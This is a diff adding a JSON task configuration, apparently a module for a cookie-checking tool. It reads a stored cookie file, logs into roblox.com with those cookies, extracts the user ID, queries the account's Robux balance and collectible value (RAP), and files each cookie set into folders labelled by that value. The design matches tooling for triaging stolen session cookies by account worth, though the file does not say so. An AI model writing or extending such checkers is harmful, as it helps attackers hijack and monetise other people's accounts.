@@ -1,0 +1,63 @@
+{
+  "name": "Roblox",
+  "author": "MaxUNof",
+  "folder_name": "Roblox",
+  "subfolder_name": "Roblox ({{robux}} Robux, {{rap}} RAP)",
+  "info_text": "Cookies: {{CookiesPath}}\n\nID: {{id}}\nURL: https://www.roblox.com/users/{{id}}\nRobux: {{robux}}\nRAP: {{rap}}",
+  "tasks": [{
+    "action": "http_request",
+    "type": "GET",
+    "url": "https://www.roblox.com",
+    "to": "roblox"
+  }, {
+    "action": "re_find",
+    "str": "{{roblox}}",
+    "regex": "(?U)data-userid=(\\d+) ",
+    "group_index": 1,
+    "to": "id"
+  }, {
+    "action": "str_compare",
+    "str1": "{{id}}",
+    "str2": "",
+    "on_true": null,
+    "on_false": [{
+      "action": "http_request",
+      "type": "GET",
+      "url": "https://economy.roblox.com/v1/users/{{id}}/currency",
+      "to": "roblox"
+    }, {
+      "action": "re_find",
+      "str": "{{roblox}}",
+      "regex": "(?U){\"robux\":(\\d+)}",
+      "group_index": 1,
+      "to": "robux"
+    }, {
+      "action": "http_request",
+      "type": "GET",
+      "url": "https://inventory.roblox.com/v1/users/{{id}}/assets/collectibles",
+      "to": "roblox"
+    }, {
+      "action": "re_find",
+      "str": "{{roblox}}",
+      "regex": "(?U)\"recentAveragePrice\":(\\d+),",
+      "group_index": 1,
+      "to": "rap"
+    }, {
+        "action": "str_compare",
+        "str1": "{{rap}}",
+        "str2": "",
+        "on_true": [{
+            "action": "variable_set",
+            "name": "rap",
+            "value": "0"
+        }],
+        "on_false": null
+    }, {
+        "action": "print",
+        "text": "Robux: {{robux}} | RAP: {{rap}}"
+    }, {
+      "action": "return",
+      "result": true
+    }]
+  }]
+}
